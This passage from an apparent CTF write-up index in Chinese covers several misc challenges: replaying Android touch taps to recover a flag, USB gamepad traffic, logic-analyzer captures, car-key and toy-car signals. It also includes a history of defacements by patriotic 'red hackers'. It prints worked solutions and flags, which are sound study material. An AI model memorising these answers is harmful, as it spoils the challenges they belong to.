<p>\u63d0\u53d6\u7684\u6570\u636e\u4e2d\u51fa\u73b0\u4e24\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u770b\u5230\u5c11\u4e86\u4e24\u6761\u6570\u636e\uff0c<code>443</code> \u6ca1\u6709\u5bf9\u5e94\u7684 <code>Y</code> \u8f74\uff0c<code>1437</code> \u6ca1\u6709\u5bf9\u5e94\u7684<code>X</code>\u8f74</p> <p></p> <p>\u5e72\u8106\u5148\u628a\u4e24\u8005\u4e92\u8865\u4e00\u4e0b\uff0c\u90fd\u662f <code>443,1437</code>\uff0c\u5229\u7528 <code>adb</code> \u8fdb\u884c\u6a21\u62df\u70b9\u51fb</p> <pre><code>adb shell input tap 622 319\nadb shell input tap 83 1901\nadb shell input tap 472 1904\nadb shell input tap 81 1892\nadb shell input tap 133 1739\nadb shell input tap 493 1603\nadb shell input tap 62 1892\nadb shell input tap 443 1437\nadb shell input tap 502 1601\nadb shell input tap 450 1755\nadb shell input tap 97 1903\nadb shell input tap 107 2064\nadb shell input tap 293 1622\nadb shell input tap 487 1620\nadb shell input tap 635 1751\nadb shell input tap 271 1601\nadb shell input tap 83 2086\nadb shell input tap 1011 1626\nadb shell input tap 65 1919\nadb shell input tap 453 1913\nadb shell input tap 386 1438\nadb shell input tap 500 1588\nadb shell input tap 84 2021\nadb shell input tap 1015 1630\nadb shell input tap 87 2074\nadb shell input tap 465 1902\nadb shell input tap 489 1446\nadb shell input tap 90 2042\nadb shell input tap 1028 1611\nadb shell input tap 77 1897\nadb shell input tap 417 1599\nadb shell input tap 77 1903\nadb shell input tap 286 1613\nadb shell input tap 438 1912\nadb shell input tap 1032 1491\nadb shell input tap 388 1615\nadb shell input tap 325 1758\nadb shell input tap 804 1623\nadb shell input tap 82 1895\nadb shell input tap 765 1908\nadb shell input tap 920 1464\nadb shell input tap 76 2056\nadb shell input tap 1016 1635\nadb shell input tap 89 2060\nadb shell input tap 769 1763\nadb shell input tap 431 1912\nadb shell input tap 385 1614\nadb shell input tap 290 1435\nadb shell input tap 443 1437\nadb shell input tap 756 1933\nadb shell input tap 95 2051\nadb shell input tap 1021 1647\nadb shell input tap 648 1906\nadb shell input tap 593 1597\nadb shell input tap 86 2069\nadb shell input tap 1029 1649\nadb shell input tap 817 1615\nadb shell input tap 767 1899\nadb shell input tap 83 1919\nadb shell input tap 1043 1643\nadb shell input tap 79 1909\nadb shell input tap 715 1611\nadb shell input tap 492 1625\nadb shell input tap 89 2090\nadb shell input tap 1040 1632\nadb shell input tap 289 1607\nadb shell input tap 542 1918\nadb shell input tap 81 1935\nadb shell input tap 292 1580\nadb shell input tap 80 1909\nadb shell input tap 756 1922\nadb shell input tap 711 1466\nadb shell input tap 83 2021\nadb shell input tap 392 1605\nadb shell input tap 587 781\n</code></pre> <p>\u672c\u6b21\u70b9\u51fb\u7684\u6548\u679c\u5982\u4e0b\uff0c\u5f88\u660e\u663e\u4e0d\u7b26\u5408 flag \u7684\u5f62\u5f0f</p> <p>\u5176\u6b21\u662f <code>443,1437</code>\uff0c\u663e\u793a\u7684\u662f <code>5</code>\uff0c\u7b2c\u4e00\u4e2a <code>5</code> \u663e\u800c\u6613\u89c1\u662f <code>C</code>\uff0c\u5c06\u5750\u6807\u6539\u6210 <code>C</code> \u7684\u5750\u6807\u5373\u53ef</p> <p></p> <p>\u7136\u800c\u5373\u4f7f\u662f <code>CatCTF{thepC4T_!5_RecprdiN9_$cr35n\"by\"inLutpev{N7}</code>\uff0c\u90a3\u4e5f\u5f88\u5947\u602a\u4e86\uff0c\u5e76\u4e14 md5 \u6821\u9a8c\u4e0d\u901a\u8fc7</p> <p></p> <p>\u901a\u8fc7\u6253\u5f00\u5b89\u5353\u7684\u89e6\u63a7 <code>\u6307\u9488\u4f4d\u7f6e</code> \u5e76\u8fdb\u884c\u5f55\u5c4f\uff0c\u5bf9\u6bcf\u6b21\u70b9\u51fb\u7684\u4f4d\u7f6e\u8fdb\u884c\u5206\u6790</p> <p></p> <p>\u5229\u7528 <code>PotPlayer</code> \u5bf9\u89c6\u9891\u8fdb\u884c\u9010\u5e27\u5206\u6790\uff0c\u53d1\u73b0\u6bcf\u6b21\u70b9\u51fb\u90fd\u5728\u952e\u76d8\u504f\u4e0b\u7684\u4f4d\u7f6e</p> <p>\u56e0\u6b64\u9700\u8981\u51cf\u5c11 <code>Y</code> \u8f74\u7684\u503c\uff0c\u901a\u8fc7\u4e0d\u65ad\u8c03\u8bd5\uff0c\u53d1\u73b0\u51cf\u5c11 <code>25</code> \u6700\u4e3a\u5408\u9002</p> <p></p> <p>\u540c\u65f6\u6ce8\u610f\u5230\u4e86 <code>1437</code> \u8fd9\u4e2a\u6ca1\u6709 <code>X</code> \u5750\u6807\u7684\u503c\uff0c\u8fd9\u4e2a\u9ad8\u5ea6\u4f4d\u4e8e\u6570\u5b57\u533a\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c<code>5</code>\u4e0d\u6b63\u786e\uff0c\u6700\u591a\u518d\u8bd5<code>9</code>\u6b21\uff0c\u4f9d\u65e7\u80fd\u83b7\u5f97\u6b63\u786e\u7684\u503c \u4fee\u6539\u540e\u4ee3\u7801\u5982\u4e0b</p> <pre><code>def get_x(v):\n    x = []\n    for i in range(4):\n        tmp = str(hex(v[i+4]))[2:]\n        if len(tmp) == 1:\n            tmp = \"0\" + tmp\n        x.append(tmp)\n    x.reverse()\n    ret = \"\"\n    for v in x:\n        ret += v\n    return int(ret,16)\n\ndef get_y(v):\n    y = []\n    for i in range(4):\n        tmp = str(hex(v[i+4]))[2:]\n        if len(tmp) == 1:\n            tmp = \"0\" + tmp\n        y.append(tmp)\n    y.reverse()\n    ret = \"\"\n    for v in y:\n        ret += v\n    return int(ret,16)\n\ndef is_y(v):\n    if v[0] == 0x03 and v[1] == 0x00 and v[2] == 0x36 and v[3] == 0x00:\n        return True\n    return False\n\ndef is_x(v):\n    if v[0] == 0x03 and v[1] == 0x00 and v[2] == 0x35 and v[3] == 0x00:\n        return True\n    return False\n\nwith open(\"1666666666\",\"rb\") as fr:\n    rd = fr.read()\nfor i in range(16,len(rd),24):\n    v = rd[i:i+8]\n    x = 0\n    y = 0\n    if is_x(v):\n        x = get_x(v)\n        print(x,end=\",\")\n    if is_y(v):\n        y = get_y(v)\n        print(y-25)\n</code></pre> <p>\u4fee\u6539\u540e\u7684\u811a\u672c\u5982\u4e0b</p> <pre><code>adb shell input tap 622 294\nadb shell input tap 83 1876\nadb shell input tap 472 1879\nadb shell input tap 81 1867\nadb shell input tap 133 1714\nadb shell input tap 493 1578\nadb shell input tap 62 1867\nadb shell input tap 472 1879\nadb shell input tap 502 1576\nadb shell input tap 450 1730\nadb shell input tap 97 1878\nadb shell input tap 107 2039\nadb shell input tap 293 1597\nadb shell input tap 487 1595\nadb shell input tap 635 1726\nadb shell input tap 271 1576\nadb shell input tap 83 2061\nadb shell input tap 1011 1601\nadb shell input tap 65 1894\nadb shell input tap 453 1888\nadb shell input tap 386 1413\nadb shell input tap 500 1563\nadb shell input tap 84 1996\nadb shell input tap 1015 1605\nadb shell input tap 87 2049\nadb shell input tap 465 1877\nadb shell input tap 489 1421\nadb shell input tap 90 2017\nadb shell input tap 1028 1586\nadb shell input tap 77 1872\nadb shell input tap 417 1574\nadb shell input tap 77 1878\nadb shell input tap 286 1588\nadb shell input tap 438 1887\nadb shell input tap 1032 1466\nadb shell input tap 388 1590\nadb shell input tap 325 1733\nadb shell input tap 804 1598\nadb shell input tap 82 1870\nadb shell input tap 765 1883\nadb shell input tap 920 1439\nadb shell input tap 76 2031\nadb shell input tap 1016 1610\nadb shell input tap 89 2035\nadb shell input tap 769 1738\nadb shell input tap 431 1887\nadb shell input tap 385 1589\nadb shell input tap 290 1410\nadb shell input tap 443 1412\nadb shell input tap 756 1908\nadb shell input tap 95 2026\nadb shell input tap 1021 1622\nadb shell input tap 648 1881\nadb shell input tap 593 1572\nadb shell input tap 86 2044\nadb shell input tap 1029 1624\nadb shell input tap 817 1590\nadb shell input tap 767 1874\nadb shell input tap 83 1894\nadb shell input tap 1043 1618\nadb shell input tap 79 1884\nadb shell input tap 715 1586\nadb shell input tap 492 1600\nadb shell input tap 89 2065\nadb shell input tap 1040 1607\nadb shell input tap 289 1582\nadb shell input tap 542 1893\nadb shell input tap 81 1910\nadb shell input tap 292 1555\nadb shell input tap 80 1884\nadb shell input tap 756 1897\nadb shell input tap 711 1441\nadb shell input tap 83 1996\nadb shell input tap 392 1580\nadb shell input tap 587 756\n</code></pre> <p>\u672c\u6b21\u8fd0\u884c\u6548\u679c\u5982\u4e0b\uff0c\u8fd9\u6b21\u5c31\u6709\u70b9\u50cf\u6837\u4e86\uff0c\u4e0d\u8fc7\u8fd9\u4e32\u7684 md5 \u503c\u8fd8\u662f\u4e0d\u5339\u914d</p> <p></p> <p>\u90a3\u5f88\u7b80\u5355\u4e86\uff0c\u5c06 <code>$cr35n</code> \u7684 <code>5</code> \u7528\u5176\u4ed6\u6570\u5b57\u8fdb\u884c\u66ff\u6362\uff0c\u6700\u7ec8\u5728\u66ff\u6362\u4e3a <code>3</code> \u65f6\uff0cmd5 \u503c\u6210\u529f\u5339\u914d</p> <p></p>"},{"location":"Misc/Chapter7/","title":"Index","text":""},{"location":"Misc/Chapter7/#\u7ea2\u5ba2","title":"\u7ea2\u5ba2","text":"<p>\u7ea2\u5ba2\u662f\u4e2d\u56fd\u5927\u9646\u653f\u6cbb\u79ef\u6781\u884c\u52a8\u4e3b\u4e49\u3001\u6c11\u65cf\u4e3b\u4e49\u4ee5\u53ca\u7231\u56fd\u4e3b\u4e49\u7684\u9ed1\u5ba2</p> <p>\u7ea2\u5ba2\u4ee5 \"\u7ef4\u62a4\u56fd\u5bb6\u5229\u76ca\uff0c\u4e0d\u5229\u7528\u7f51\u7edc\u6280\u672f\u5165\u4fb5\u81ea\u5df1\u56fd\u5bb6\u7684\u7535\u8111\uff0c\u4e3a\u7956\u56fd\u4e89\u5149\" \u4e3a\u5b97\u65e8</p> <p>\u7ea2\u5ba2\u8d77\u6e90\u4e8e 1999 \u5e74\u7684\u4e94\u516b\u4e8b\u4ef6\uff0c\u5728\u7f8e\u56fd\u8f70\u70b8\u4e2d\u56fd\u9a7b\u5357\u65af\u62c9\u592b\u5927\u4f7f\u9986\u540e\u7684\u7b2c\u4e8c\u5929\uff0c\u4e2d\u56fd\u4fe1\u606f\u5b89\u5168\u4ece\u4e1a\u8005\u82d7\u5f97\u96e8\u5236\u4f5c\u4e86\u7b2c\u4e00\u4e2a\u7ea2\u5ba2\u7f51\u7ad9\u2014\u2014\u201c\u4e2d\u56fd\u7ea2\u5ba2\u4e4b\u7956\u56fd\u56e2\u7ed3\u9635\u7ebf\u201d\uff08\u968f\u540e\u76847\u6708\u4efd\u6539\u540d\u4e3a\u201c\u4e2d\u56fd\u7ea2\u5ba2\u4e4b\u7956\u56fd\u7edf\u4e00\u6218\u7ebf\u201d\uff09\uff0c\u5176\u8bcd\u8bed\u6765\u6e90\u4e8e\u65b0\u52a0\u5761\u300a\u8054\u5408\u65e9\u62a5\u300b\u7684\u4e00\u7bc7\u62a5\u9053\u5f62\u5bb9\u7684\u201c\u7ea2\u65d7\u4e0b\u7684\u9ed1\u5ba2\u201d\uff0c\u7531\u6b64\u521b\u9020\u51fa\u4e86\u4e00\u4e2a\u65b0\u7684\u9ed1\u5ba2\u5206\u652f\u2014\u2014\u201c\u7ea2\u5ba2\u201d\u3002\u80cc\u79bb\u9ed1\u5ba2\u6240\u8c13\u7684\u65e0\u653f\u5e9c\u4e3b\u4e49\u7cbe\u795e\uff0c\u4ee5\u5ba3\u626c\u7231\u56fd\u4e3b\u4e49\u4e0b\u7684\u9ed1\u5ba2\u7cbe\u795e\u4e3a\u4e3b\u5bfc\uff0c\u5e76\u5f15\u7528\u4e86\u6bdb\u6cfd\u4e1c\u9752\u5e74\u65f6\u7684\u8bdd\u8bed\uff1a\u201c\u56fd\u5bb6\u662f\u6211\u4eec\u7684\u56fd\u5bb6\uff0c\u4eba\u6c11\u662f\u6211\u4eec\u7684\u4eba\u6c11\uff0c\u6211\u4eec\u4e0d\u558a\u8c01\u558a\uff1f\u6211\u4eec\u4e0d\u5e72\u8c01\u5e72\uff1f\u201d\u3002\u7f51\u7ad9\u5728\u77ed\u77ed\u7684\u6570\u5929\u5185\u8bbf\u95ee\u91cf\u5df2\u8fbe50\u591a\u4e07\uff0c\u5e76\u51fa\u73b0\u5728\u65b0\u6d6a\u7f51\u7684\u65b0\u95fb\u94fe\u63a5\u4e2d</p> <p>2010 \u5e74\u767e\u5ea6\u57df\u540d\u88ab\u52ab\u6301\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u6709\u81ea\u79f0\u4e2d\u56fd\u7ea2\u5ba2\u7684\u7f51\u6c11\u547c\u5401\u653b\u51fb\u4f0a\u6717\u7f51\u7ad9\u3002\u968f\u540e\uff0c\u4f0a\u6717\u4e00\u57df\u540d\u4e3airibu.ir\u7684\u6559\u80b2\u673a\u6784\u7f51\u7ad9\u88ab\u653b\u51fb\uff0c\u5728\u767e\u5ea6\u7f51\u7ad9\u88ab\u653b\u51fb\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u8be5\u6559\u80b2\u673a\u6784\u7f51\u7ad9\u9875\u9762\u51fa\u73b0\u9ed1\u5c4f\uff0c\u4e4b\u540e\u51fa\u73b0 \u201cLong live The People's Republic of China\u201d\uff08\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u4e07\u5c81\uff09\u7684\u5b57\u6837\u3002\u800c\u591a\u4e2a\u4f0a\u6717\u653f\u5e9c\u7f51\u7ad9\u4ea6\u88ab\u4e2d\u56fd\u9ed1\u5ba2\u653b\u51fb</p> <p>2010 \u5e74\u9a6c\u5c3c\u62c9\u524d\u8b66\u5458\u52ab\u6301\u9999\u6e2f\u65c5\u884c\u56e2\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u83f2\u5f8b\u5bbe\u5e03\u62c9\u5e72\u7701\u653f\u5e9c\u5b98\u7f51\u7591\u4f3c\u88ab\u4e2d\u56fd\u7ea2\u5ba2\u653b\u51fb\u3002\u9ed1\u5ba2\u5728\u7f51\u9875\u4e0a\u60ac\u6302\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u56fd\u65d7\uff0c\u5e76\u7559\u4e0b\u4e86\u8981\u6c42\u83f2\u5f8b\u5bbe\u653f\u5e9c\u5c31\u83f2\u52ab\u6301\u4eba\u8d28\u4e8b\u4ef6\u505a\u9053\u6b49\u7684\u6587\u5b57</p> <p>2011 \u5e74\uff0c\u5357\u6d77\u95ee\u9898\u4e0d\u65ad\u5347\u7ea7\uff0c\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u591a\u5bb6\u5730\u65b9\u653f\u5e9c\u7f51\u7ad9\u906d\u8d8a\u5357\u9ed1\u5ba2\u653b\u51fb\uff0c\u88ab\u5165\u4fb5\u7f51\u7ad9\u6807\u6709\u201c\u8d8a\u5357\u9ed1\u5ba2\u662f\u7b2c\u4e00\u201d\uff0c\u201c\u8d8a\u5357\u4eba\u6c11\u613f\u610f\u727a\u7272\u6765\u4fdd\u62a4\u6d77\u6d0b\uff0c\u5929\u7a7a\u548c\u56fd\u5bb6\u201d\u7b49\u6587\u5b57\u3002\u4e2d\u56fd\u7ea2\u5ba2\u53cd\u51fb\u8d8a\u5357\u7f51\u7ad9\uff0c\u636e\u7edf\u8ba1\u6709\u5343\u4f59\u5bb6\u8d8a\u5357\u7f51\u7ad9\u88ab\u653b\u9677\u5e76\u6302\u4e0a\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u56fd\u65d7</p> <p>2012 \u5e74 4 \u6708\uff0c\u4e2d\u83f2\u9ec4\u5ca9\u5c9b\u5bf9\u5cd9\u5f15\u53d1\u4e2d\u83f2\u9ed1\u5ba2\u4e92\u9ed1\u5bf9\u65b9\u56fd\u5bb6\u7f51\u7ad9\u3002\u4e2d\u56fd\u6570\u5bb6\u7f51\u7ad9\u906d\u83f2\u5f8b\u5bbe\u9ed1\u5ba2\u653b\u51fb\uff0c\u5176\u4e2d\u5305\u62ec\u201c\u4e2d\u56fd\u5927\u5b66\u751f\u81ea\u5f3a\u4e4b\u661f\u201d\u3001\u4e2d\u9752\u5728\u7ebf\u3001\u4e2d\u9752\u89c6\u9891\u7b497\u5bb6\u7f51\u7ad9\u3002\u4e2d\u56fd\u9ed1\u5ba2\u653b\u51fb\u4e86\u83f2\u5f8b\u5bbe\u5927\u5b66\u7f51\u7ad9\uff0c\u5c06\u8be5\u6821\u4e3b\u9875\u53d8\u6210\u4e00\u5f20\u9ec4\u5ca9\u5c9b\u6d77\u57df\u7684\u5730\u56fe\uff0c\u5e76\u5c06\u201c\u6211\u4eec\u6765\u81ea\u4e2d\u56fd\u201d\u3001\u201c\u9ec4\u5ca9\u5c9b\u662f\u6211\u4eec\u7684\u201d\u7b49\u6587\u5b57\u6253\u5728\u5730\u56fe\u4e0a</p> <p>2022 \u5e74 8 \u6708 2 \u65e5\uff0c\u65f6\u4efb\u7f8e\u56fd\u4f17\u8bae\u9662\u8bae\u957f\u4f69\u6d1b\u897f\u8bbf\u53f0\uff0c\u4e2d\u534e\u6c11\u56fd\u603b\u7edf\u5e9c\u5b98\u7f51\u906d\u5230\u4e2d\u56fd\u7ea2\u5ba2\u653b\u51fb\u30022022 \u5e74 8\u6708 3 \u65e5\uff0c\u53f0\u6e7e\u9ad8\u94c1\u516c\u53f8\u65b0\u5de6\u8425\u7ad9\u7684\u5e7f\u544a\u770b\u677f\u4ee5\u53ca\u8d85\u5546\u95e8\u5e02\u7684\u5c4f\u5e55\u968f\u540e\u4e5f\u88ab\u690d\u5165\u6709\u5173\u201c\u53cd\u4f69\u6d1b\u897f\u201d\u7684\u6587\u5b57\u3002\u4e4b\u540e 2022 \u5e74 8 \u6708 6 \u65e5\uff0c\u53f0\u6e7e\u6c11\u89c6\u7535\u89c6\u53f0\u88ab\u4e2d\u56fd\u7ea2\u5ba2\u5165\u4fb5\u3002\u4e4b\u540e\u665a\u95f4\u65f6\u523b\u6709\u7f51\u53cb\u5ffd\u7136\u53d1\u73b0\u6c11\u89c6\u7535\u89c6\u53f0\u51fa\u73b0\u4e86\u4e00\u9762\u4e2d\u56fd\u7248\u56fe\u4ee5\u53ca\u7b80\u4f53\u5b57\u201c\u4e2d\u56fd\u4e00\u70b9\u90fd\u4e0d\u80fd\u5c11\u201d\u7684\u5b57\u6837\u5916\u52a0\u80cc\u666f\u97f3\u4e50\u300a\u6211\u548c\u6211\u7684\u7956\u56fd\u300b\u603b\u5171\u7ef4\u63013\u5206\u949f</p> <p></p>"},{"location":"Misc/Chapter7/7-1/","title":"G-code \u7ed8\u56fe","text":""},{"location":"Misc/Chapter7/7-1/#g-code-\u7ed8\u56fe","title":"G-code \u7ed8\u56fe","text":"<p>\u63d0\u793a\u662f g-code\uff0c\u4e0a\u7f51\u641c\u641c</p> <p></p> <p>\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u662f\u5e26\u6709 x\uff0cy \u5750\u6807</p> <p></p> <p>\u53bb NC Viewer \u5728\u7ebf\u7ed8\u56fe\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter7/7-2/","title":"SPI \u534f\u8bae\u9690\u5199","text":""},{"location":"Misc/Chapter7/7-2/#spi-\u534f\u8bae\u9690\u5199","title":"SPI \u534f\u8bae\u9690\u5199","text":"<p>\u4f7f\u7528\u5de5\u5177 Saleae Logic \u6253\u5f00\u6587\u4ef6</p> <p>\u4f7f\u7528 SPI \u5206\u6790\u534f\u8bae\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter7/7-3/","title":"L2C \u534f\u8bae\u9690\u5199","text":""},{"location":"Misc/Chapter7/7-3/#l2c-\u534f\u8bae\u9690\u5199","title":"L2C \u534f\u8bae\u9690\u5199","text":"<p>\u4f7f\u7528\u5de5\u5177 Saleae Logic \u6253\u5f00\u6587\u4ef6</p> <p>\u4f7f\u7528 L2C \u5206\u6790\u534f\u8bae\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter7/7-4/","title":"\u624b\u67c4\u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter7/7-4/#\u624b\u67c4\u6d41\u91cf\u9690\u5199","title":"\u624b\u67c4\u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u5168\u662f USB \u6d41\u91cf</p> <p></p> <p>\u63d0\u53d6\u6570\u636e</p> <pre><code>tshark -r .\\13.pcapng -T fields -e usb.capdata &gt; 13.txt\n</code></pre> <p>\u89c2\u5bdf\u4e3b\u8981\u6570\u636e\u53d1\u73b0\u4e24\u5904\u4e0d\u4e00\u6837\u7684\u5730\u65b9</p> <p></p> <p>\u53c2\u8003\u535a\u5ba2</p> <p>\u6839\u636e\u4e0a\u9762\u90a3\u7bc7\u535a\u5ba2\uff0c\u64cd\u7eb5\u6746\u7684\u6d41\u91cf\u4e5f\u5206\u5de6\u53f3\uff0c\u5404\u5360\u56db\u4e2a\u5b57\u8282\uff0c\u5206\u522b\u662f\u4e24\u4e2a\u5b57\u8282 x \u8f74\uff0c\u4e24\u4e2a\u5b57\u8282 y \u8f74</p> <p>\u5360 4 \u4e2a\u5b57\u8282\u7684\u968f\u673a\u53d8\u5316\u7684\u6d41\u91cf\u4e5f\u5c31\u53ea\u6709 11-14 \u90a3\u4e00\u90e8\u5206,\uff0c\u5c31\u53ef\u4ee5\u63a8\u65ad\u51fa\u5b57\u8282 9 \u662f\u5de6\u6273\u673a\u6d41\u91cf\uff0c\u5b57\u8282 11-14 \u662f\u5de6\u6447\u6746\u6d41\u91cf</p> <p>\u4e5f\u53ef\u4ee5\u731c\u51fa\u5b57\u8282 10 \u662f\u53f3\u6273\u673a\u6d41\u91cf\uff0c\u5b57\u8282 15-18 \u662f\u53f3\u6447\u6746\u6d41\u91cf.</p> <p>\u6839\u636e\u6d41\u91cf\u753b\u56fe\u5373\u53ef\uff0c\u6ce8\u610f\u6447\u6746\u6d41\u91cf\u662f\u6447\u6746\u5bf9\u4e8e\u4e2d\u5fc3\u7684\u504f\u79fb,\u662f\u4e00\u4e2a\u6709\u7b26\u53f7\u6574\u6570,\u6839\u636e\u8fd9\u4e2a\u504f\u79fb\u7b97\u5750\u6807\u7136\u540e\u7ed8\u5236\u5c31\u884c</p> <pre><code>import os.path\nimport string\nimport struct\nimport math\nfrom matplotlib import pyplot as plt\n\n\n# \u89e3\u6790\u624b\u67c4\u6570\u636e\u5305\ndef parse_gamepad_data(data):\n    # \u83b7\u53d6\u5de6\u53f3\u6273\u673a\u72b6\u6001\uff08\u5b57\u82824\u548c\u5b57\u82825\uff09\n    left_trigger = data[8]\n    right_trigger = data[9]\n\n    # \u89e3\u6790\u5de6\u64cd\u7eb5\u6746\u4f4d\u7f6e\uff08\u5b57\u82826\u5230\u5b57\u82829\uff09\n    # \u5de6\u64cd\u7eb5\u6746 X\u8f74 (\u5b57\u82826, 7) \u548c Y\u8f74 (\u5b57\u82828, 9)\n    left_stick_x = struct.unpack('&lt;h', bytes(data[10:12]))[0]  # \u5c0f\u7aef\u6a21\u5f0f\n    left_stick_y = struct.unpack('&lt;h', bytes(data[12:14]))[0]  # \u5c0f\u7aef\u6a21\u5f0f\n    print(left_stick_x, left_stick_y)\n    # \u89e3\u6790\u53f3\u64cd\u7eb5\u6746\u4f4d\u7f6e\uff08\u5b57\u828210\u5230\u5b57\u828213\uff09\n    # \u53f3\u64cd\u7eb5\u6746 X\u8f74 (\u5b57\u828210, 11) \u548c Y\u8f74 (\u5b57\u828212, 13)\n    right_stick_x = struct.unpack('&lt;h', bytes(data[14:16]))[0]  # \u5c0f\u7aef\u6a21\u5f0f\n    right_stick_y = struct.unpack('&lt;h', bytes(data[16:18]))[0]  # \u5c0f\u7aef\u6a21\u5f0f\n    return left_trigger, left_stick_x, left_stick_y, right_stick_x, right_stick_y\n\n\ndef extract_visible_chars(byte_data):\n    # \u83b7\u53d6\u6240\u6709\u53ef\u6253\u5370\u5b57\u7b26\n    printable_chars = string.printable.encode()  # \u83b7\u53d6\u53ef\u6253\u5370\u5b57\u7b26\u7684\u5b57\u8282\u5f62\u5f0f\n    # \u4ece\u5b57\u8282\u6570\u636e\u4e2d\u7b5b\u9009\u51fa\u53ef\u6253\u5370\u5b57\u7b26\n    visible_chars = bytes([byte for byte in byte_data if byte in printable_chars])\n    return visible_chars\n\n\n# \u521d\u59cb\u5316\u9f20\u6807\u5750\u6807\nmouse_x, mouse_y = 0, 0\n\n# \u7528\u4e8e\u8bb0\u5f55\u9f20\u6807\u8f68\u8ff9\u7684\u5750\u6807\ntrajectory_x = [mouse_x]\ntrajectory_y = [mouse_y]\nn = 0\ns = 0\ncurrent_direction = None  # \u5f53\u524d\u65b9\u5411\ndirection_factor = 0  # \u5f53\u524d\u65b9\u5411\u7684\u7cfb\u6570\n\nif not os.path.exists(\"./1\"):\n    os.makedirs(\"./1\")\n\nwith open(\"13.txt\", 'rb') as txt:\n    lines = txt.read().splitlines()\n    for line in lines:\n        print(len(line))\n        if len(line) &lt; 100:\n            continue\n        line = extract_visible_chars(line)\n        line_bytes = bytes.fromhex(str(line)[2:-1])  # \u5148\u89e3\u7801\u4e3a\u5b57\u7b26\u4e32\uff0c\u518d\u4ece\u5341\u516d\u8fdb\u5236\u8f6c\u6362\u4e3a\u5b57\u8282\n        s += 1\n        # \u89e3\u6790\u6570\u636e\n        left_trigger, left_stick_x, left_stick_y, right_stick_x, right_stick_y = parse_gamepad_data(line_bytes)\n\n        # \u66f4\u65b0\u9f20\u6807\u5750\u6807\n        mouse_x += left_stick_x\n        mouse_y +=  left_stick_y\n\n        # \u8bb0\u5f55\u5f53\u524d\u4f4d\u7f6e\n        if left_trigger &gt;250:\n            trajectory_x.append(mouse_x)\n            trajectory_y.append(mouse_y)\n        elif left_trigger == 0:\n            s = 0\n            if len(trajectory_x) &gt; 0:\n                plt.figure(figsize=(10, 8))\n                plt.plot(trajectory_x, trajectory_y, marker='o', color='b', markersize=3)\n                plt.title(\"Mouse Movement Trajectory from Gamepad Right Stick with Nonlinear Mapping\")\n                plt.xlabel(\"X Position\")\n                plt.ylabel(\"Y Position\")\n                plt.grid(True)\n                plt.axis('equal')\n                # plt.show()\n                plt.savefig(f\"./1/{n}.png\")\n                plt.close()\n                n += 1\n            trajectory_x = []\n            trajectory_y = []\n</code></pre> <p></p>"},{"location":"Misc/Chapter7/7-5/","title":"\u8f66\u94a5\u5319\u4fe1\u53f7\u9690\u5199","text":""},{"location":"Misc/Chapter7/7-5/#\u8f66\u94a5\u5319\u4fe1\u53f7\u9690\u5199","title":"\u8f66\u94a5\u5319\u4fe1\u53f7\u9690\u5199","text":"<p>\u5c06\u97f3\u9891\u6587\u4ef6\u653e\u5165 Audacity \u4e2d\u89e3\u6790\u53d1\u73b0\u6709\u7c97\u6709\u7ec6</p> <p></p> <p>\u7ec6\u7684\u8ba4\u4e3a\u662f 0\uff0c\u5bbd\u7684\u8ba4\u4e3a\u662f 1</p> <pre><code>00111010010101010011000100011101001010101001100010\n</code></pre> <p>\u94a5\u5319\u4fe1\u53f7\uff08PT224X\uff09 = \u540c\u6b65\u5f15\u5bfc\u7801\uff088bit\uff09 + \u5730\u5740\u4f4d\uff0820bit\uff09 + \u6570\u636e\u4f4d\uff084bit\uff09 + \u505c\u6b62\u7801\uff081bit\uff09</p> <pre><code>sctf{01110100101010100110}\n</code></pre>"},{"location":"Misc/Chapter7/7-6/","title":"\u73a9\u5177\u8f66\u8fd0\u52a8\u8f68\u8ff9\u9690\u5199","text":""},{"location":"Misc/Chapter7/7-6/#\u73a9\u5177\u8f66\u8fd0\u52a8\u8f68\u8ff9\u9690\u5199","title":"\u73a9\u5177\u8f66\u8fd0\u52a8\u8f68\u8ff9\u9690\u5199","text":"<p>\u770b\u770b\u4ed6\u7684\u5c0f\u8f66\u5728\u5e72\u5565\uff0c\u60f3\u5230\u53ef\u80fd\u662f\u8981\u5206\u6790\u5c0f\u8f66\u7684\u8fd0\u52a8\u8f68\u8ff9</p> <p>\u67e5\u4e86\u4e0b\u5c0f\u8f66\u7684\u578b\u53f7\u540e\u53d1\u73b0\u6709\u4e00\u4e2a\u64cd\u4f5c\u624b\u518c</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u548c\u7ed9\u7684 wav \u6587\u4ef6\u662f\u5bf9\u5e94\u7684\uff0c\u4e8e\u662f\u6211\u4eec\u5f00\u59cb\u5199\u811a\u672c\u8f93\u51fa\u6bcf\u4e2a\u7aef\u53e3\u7684\u4fe1\u53f7\u60c5\u51b5</p> <pre><code>import wave\nimport numpy as np\nimport turtle\n\nfilename = 'L293_1_A1'\nwavfile = wave.open(filename + '.wav','rb')\n# \u83b7\u53d6\u97f3\u9891\u53c2\u6570\nparams = wavfile.getparams()\n# \u89e3\u5305\u53c2\u6570\uff1anchannels: \u58f0\u9053\u6570\uff0csampwidth: \u91c7\u6837\u5bbd\u5ea6(\u5b57\u8282)\uff0cframerate: \u91c7\u6837\u7387(Hz)\uff0cnframes: \u603b\u5e27\u6570\nnchannels, sampwidth, framerate, nframes = params[:4]\n# \u8bfb\u53d6\u6240\u6709\u97f3\u9891\u5e27\nsig = wavfile.readframes(nframes)\n# \u5c06\u5b57\u8282\u6570\u636e\u8f6c\u6362\u4e3a short \u7c7b\u578b\u7684 numpy \u6570\u7ec4\nsig = np.frombuffer(sig, dtype=np.short)\nseq = ''\n# \u6839\u636e\u91c7\u6837\u503c\u662f\u5426\u5927\u4e8e 